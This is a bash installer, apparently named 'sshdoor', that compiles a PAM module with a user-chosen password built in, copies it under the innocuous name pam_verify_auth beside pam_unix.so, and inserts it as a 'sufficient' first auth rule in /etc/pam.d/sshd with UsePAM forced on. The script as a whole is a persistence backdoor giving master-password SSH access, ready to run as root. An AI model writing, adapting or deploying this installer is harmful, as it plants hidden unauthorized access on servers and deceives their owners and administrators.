#!/bin/bash

echo "
                █████          █████
                ░░███          ░░███
  █████   █████  ░███████    ███████   ██████   ██████  ████████
 ███░░   ███░░   ░███░░███  ███░░███  ███░░███ ███░░███░░███░░███
░░█████ ░░█████  ░███ ░███ ░███ ░███ ░███ ░███░███ ░███ ░███ ░░░
 ░░░░███ ░░░░███ ░███ ░███ ░███ ░███ ░███ ░███░███ ░███ ░███
 ██████  ██████  ████ █████░░████████░░██████ ░░██████  █████
░░░░░░  ░░░░░░  ░░░░ ░░░░░  ░░░░░░░░  ░░░░░░   ░░░░░░  ░░░░░

================================================================="

# Check if a parameter is provided and not empty
if [[ -z "$1" ]]; then
    echo "[-] error: missing required argument!"
    echo "Usage: $0 <password>"
    exit 1
fi

# Store the parameter
PASSWORD="$1"

echo "[+] preparing for password: ${PASSWORD}"

MOD_NAME="pam_verify_auth"

SOURCE="${MOD_NAME}.c"
OBJECT="${MOD_NAME}.o"
MODULE="${MOD_NAME}.so"

PAMD_PATH="/etc/pam.d/sshd"

set -e

# ==================================== verify permissions
if [[ $EUID -ne 0 ]]; then
    echo "[-] this script must be run as root (use sudo)." >&2
    exit 1
fi
# ==================================== check for sshd / pam.d
if [[ ! -f $PAMD_PATH ]]; then
    echo "[-] ${PAMD_PATH} not found, exiting..." >&2
    exit 1
fi
if service sshd status &>/dev/null || systemctl is-active --quiet sshd; then
    echo "[+] ssh status: sshd is running"
elif service --status-all 2>/dev/null | grep -q sshd || systemctl list-unit-files --type=service | grep -q sshd; then
    echo "[*] ssh status: found sshd service, not running"
else
    echo "[-] ssh status: no sshd service was found, exiting..."
    exit 1
fi

# ==================================== check OS
echo "[*] checking OS architecture..."
GCC_PKG="gcc"
if [[ -f /etc/debian_version ]]; then
    echo "[+] OS detected: debian"
    OS="DEB"
    PKG_MANAGER="apt-get"
    PAM_PKG="libpam0g-dev"
elif [[ -f /etc/redhat-release ]]; then
    echo "[+] OS detected: RHEL"
    OS="RHEL"
    PKG_MANAGER="yum"
    PAM_PKG="pam-devel"
else
    echo "[-] unsupported OS, exiting..."
    exit 1
fi
# ==================================== install dependencies
echo "[*] installing required packages using ${PKG_MANAGER}..."
$PKG_MANAGER update -y &> /dev/null || true
$PKG_MANAGER install -y $GCC_PKG $PAM_PKG &>/dev/null || true
# ==================================== verify gcc is installed
if ! command -v gcc &>/dev/null; then
    echo "[-] GCC was not installed, exiting..." >&2
    exit 1
fi
# ==================================== extract target directory pam
echo "[*] searching for 'pam_unix.so' to extract target directory..."
pam_unix_path=$(realpath "$(find / -name "pam_unix.so" -user root 2>/dev/null | head -1)")
if [[ -z "$pam_unix_path" ]]; then
    echo "[-] 'pam_unix.so' not found on this system. was it installed correctly?"
    exit 1
fi
DEST_DIR=$(dirname "$pam_unix_path")
echo "[+] target directory set to: ${DEST_DIR}"
# ==================================== compile
echo "[*] compiling ${SOURCE}..."
echo "[>] gcc -fPIC -c ${SOURCE} -o ${OBJECT} -Wall -Wextra -O2 -DSECRET="\"${PASSWORD}\"""
gcc -fPIC -c ${SOURCE} -o ${OBJECT} -Wall -Wextra -O2 -DSECRET="\"${PASSWORD}\""
# ==================================== link
echo "[*] linking object file into shared module ${MODULE}..."
echo "[>] gcc -shared -o ${MODULE} ${OBJECT} -lpam"
gcc -shared -o ${MODULE} ${OBJECT} -lpam
# ==================================== inject into pam directory
echo "[*] moving ${MODULE} to ${DEST_DIR}..."
mv ${MODULE} ${DEST_DIR}
# ==================================== set proper permissions
echo "[*] setting ownership to root:root and permissions to 644..."
chown root:root "${DEST_DIR}/${MODULE}"
chmod 644 "${DEST_DIR}/${MODULE}"
# ==================================== edit /etc/pam.d/sshd
if grep -q "$MODULE" "$PAMD_PATH"; then
    echo "[*] module '$MODULE' is already present in ${PAMD_PATH}, skip modifying..."
else
    echo "[+] injecting '${MODULE}' into ${PAMD_PATH}..."
    pamd_entry="auth    sufficient    ${DEST_DIR}/${MODULE}"
    pamd_entry_escaped=$(echo "$pamd_entry" | sed 's|/|\\/|g')
    if [[ "$OS" == "DEB" ]]; then # add to the beginning of the file
        sed -i "1s|^|${pamd_entry_escaped}\n|" $PAMD_PATH
    elif [[ "$OS" == "RHEL" ]]; then # maintain same format
        if ! grep -q '^auth' /etc/pam.d/sshd; then
          sed -i "1i ${pamd_entry_escaped}" $PAMD_PATH
        else
          sed -i "0,/^auth/s|^auth|${pamd_entry_escaped}\n&|" $PAMD_PATH
        fi
    fi
    if ! grep -q "$MODULE" /etc/pam.d/sshd; then
        echo "[-] unable to inject ${MODULE} into ${PAMD_PATH}"
        exit 1
    else
      echo "[+] ${MODULE} was injected into ${PAMD_PATH}"
    fi
fi
# ==================================== enable UsePAM
SSH_CONFIG="/etc/ssh/sshd_config"
echo "[*] setting 'UsePAM yes' in ${SSH_CONFIG}..."
if grep -qE "^\s*UsePAM\s+yes" "$SSH_CONFIG"; then
    echo "[+] UsePAM is already enabled"
else
    if grep -E "^\s*UsePAM\s+no" "$SSH_CONFIG"; then
        sed -i -E 's/^\s*UsePAM\s+no/UsePAM yes/' "$SSH_CONFIG"
    elif grep -E "^\s*#\s*UsePAM\s+yes" "$SSH_CONFIG"; then # if commented out, uncomment and set to yes
        sed -i -E 's/^\s*#\s*UsePAM\s+yes/UsePAM yes/' "$SSH_CONFIG"
    else
        echo "UsePAM yes" >> "$SSH_CONFIG" # UsePAM is missing entirely
    fi
    echo "[+] UsePAM has been enabled"
fi
# ==================================== finish
echo "[+] PAM module installation complete! restart ssh service to apply the changes"
